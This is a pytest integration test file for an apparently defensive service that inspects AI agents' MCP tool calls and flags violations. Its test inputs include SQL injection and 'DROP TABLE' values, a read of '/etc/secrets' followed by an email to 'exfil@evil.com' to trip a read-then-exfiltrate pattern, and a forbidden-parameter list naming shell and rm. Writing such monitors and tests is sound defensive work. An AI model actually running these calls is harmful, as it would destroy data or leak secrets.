"""MCP routes integration tests against live Postgres."""

from __future__ import annotations

import uuid

import pytest

from app.auth.jwt_service import issue_token_pair
from app.db.models.organization import Organization
from app.db.models.user import User
from app.db.session import SessionLocal

pytestmark = pytest.mark.integration


async def _user_with_role(org: Organization, role: str) -> User:
    user = User(
        id=uuid.uuid4(),
        org_id=org.id,
        email=f"u-{uuid.uuid4().hex[:6]}@example.com",
        name=role,
        role=role,
        idp_groups=[],
    )
    async with SessionLocal() as db:
        db.add(user)
        await db.commit()
        await db.refresh(user)
    return user


async def _admin_headers(org: Organization) -> dict[str, str]:
    user = await _user_with_role(org, "admin")
    pair = await issue_token_pair(
        org_id=org.id, user_id=user.id, role="admin", auth_method="oidc"
    )
    return {"Authorization": f"Bearer {pair.access_token}"}


@pytest.mark.asyncio
async def test_list_tools_returns_builtins(
    fresh_org: Organization, app_client
) -> None:
    headers = await _admin_headers(fresh_org)
    async with app_client as client:
        r = await client.get("/v1/mcp/tools", headers=headers)
        assert r.status_code == 200
        tools = r.json()
        names = [t["tool_name"] for t in tools]
        # All 8 default tools surface as builtins on a fresh org
        for expected in (
            "read_file",
            "write_file",
            "execute_command",
            "send_email",
            "http_request",
            "database_query",
            "database_write",
            "update_policy",
        ):
            assert expected in names
        assert all(t["is_builtin"] for t in tools)


@pytest.mark.asyncio
async def test_custom_tool_overrides_builtin(
    fresh_org: Organization, app_client
) -> None:
    headers = await _admin_headers(fresh_org)
    async with app_client as client:
        # Override read_file with a stricter profile
        r = await client.post(
            "/v1/mcp/tools",
            json={
                "tool_name": "read_file",
                "access_mode": "read",
                "description": "stricter org override",
                "allowed_params": ["path"],
                "forbidden_params": ["execute", "write", "shell", "delete", "rm"],
            },
            headers=headers,
        )
        assert r.status_code == 201, r.text

        r = await client.get("/v1/mcp/tools", headers=headers)
        tools = {t["tool_name"]: t for t in r.json()}
        rf = tools["read_file"]
        assert rf["is_builtin"] is False
        assert rf["description"] == "stricter org override"


@pytest.mark.asyncio
async def test_inspect_records_call_and_violation(
    fresh_org: Organization, app_client
) -> None:
    headers = await _admin_headers(fresh_org)
    async with app_client as client:
        r = await client.post(
            "/v1/mcp/inspect",
            json={
                "session_id": "sess-1",
                "agent_id": "agent-A",
                "tool_name": "database_query",
                "params": {"query": "SELECT * FROM x; DROP TABLE users"},
            },
            headers=headers,
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["recommendation"] in ("flag", "block")
        assert any(v["type"] == "forbidden_value" for v in body["violations"])

        # The call landed in the chain history
        r = await client.get("/v1/mcp/chain/sess-1", headers=headers)
        assert r.status_code == 200
        chain = r.json()
        assert len(chain) == 1
        assert chain[0]["tool_name"] == "database_query"

        # And a violation row was created
        r = await client.get("/v1/mcp/violations", headers=headers)
        assert r.status_code == 200
        violations = r.json()
        assert len(violations) >= 1
        assert any(v["tool_name"] == "database_query" for v in violations)


@pytest.mark.asyncio
async def test_chain_pattern_detected_across_calls(
    fresh_org: Organization, app_client
) -> None:
    """A sequence of read → exfil tool calls in the same session should
    trip the read_then_exfil chain pattern on the second call."""
    headers = await _admin_headers(fresh_org)
    async with app_client as client:
        # Call 1: read_file (access_mode=read)
        r = await client.post(
            "/v1/mcp/inspect",
            json={
                "session_id": "sess-attack",
                "agent_id": "agent-bad",
                "tool_name": "read_file",
                "params": {"path": "/etc/secrets"},
            },
            headers=headers,
        )
        assert r.status_code == 200
        assert not r.json()["chain_matches"]  # first call — no chain yet

        # Call 2: send_email (access_mode=exfil) — should match read_then_exfil
        r = await client.post(
            "/v1/mcp/inspect",
            json={
                "session_id": "sess-attack",
                "agent_id": "agent-bad",
                "tool_name": "send_email",
                "params": {
                    "to": "exfil@evil.com",
                    "subject": "data",
                    "body": "...",
                },
            },
            headers=headers,
        )
        assert r.status_code == 200
        body = r.json()
        names = [c["name"] for c in body["chain_matches"]]
        assert "read_then_exfil" in names
        # Critical chain alone → flag
        assert body["recommendation"] == "flag"


@pytest.mark.asyncio
async def test_resolve_violation_marks_status(
    fresh_org: Organization, app_client
) -> None:
    headers = await _admin_headers(fresh_org)
    async with app_client as client:
        r = await client.post(
            "/v1/mcp/inspect",
            json={
                "session_id": "sess-r",
                "agent_id": "agent",
                "tool_name": "database_query",
                "params": {"query": "DROP TABLE x"},
            },
            headers=headers,
        )
        assert r.status_code == 200

        r = await client.get("/v1/mcp/violations", headers=headers)
        violation_id = r.json()[0]["id"]

        r = await client.post(
            f"/v1/mcp/violations/{violation_id}/resolve",
            json={"status": "false_positive", "notes": "intended cleanup"},
            headers=headers,
        )
        assert r.status_code == 200
        assert r.json()["resolution_status"] == "false_positive"
        assert r.json()["resolution_notes"] == "intended cleanup"


@pytest.mark.asyncio
async def test_cross_org_isolation_on_violations(
    fresh_org: Organization, app_client
) -> None:
    """Org A's violations must not appear in Org B's violation list."""
    headers_a = await _admin_headers(fresh_org)

    other = Organization(
        id=uuid.uuid4(), name="Other", slug=f"other-{uuid.uuid4().hex[:6]}"
    )
    async with SessionLocal() as db:
        db.add(other)
        await db.commit()

    try:
        headers_b = await _admin_headers(other)

        async with app_client as client:
            # A creates a violation
            await client.post(
                "/v1/mcp/inspect",
                json={
                    "session_id": "sess-x",
                    "agent_id": "a",
                    "tool_name": "database_query",
                    "params": {"query": "DROP TABLE x"},
                },
                headers=headers_a,
            )
            # B should see nothing
            r = await client.get("/v1/mcp/violations", headers=headers_b)
            assert r.status_code == 200
            assert r.json() == []
    finally:
        from sqlalchemy import text

        async with SessionLocal() as db:
            await db.execute(
                text("DELETE FROM organizations WHERE id = :id"), {"id": other.id}
            )
            await db.commit()
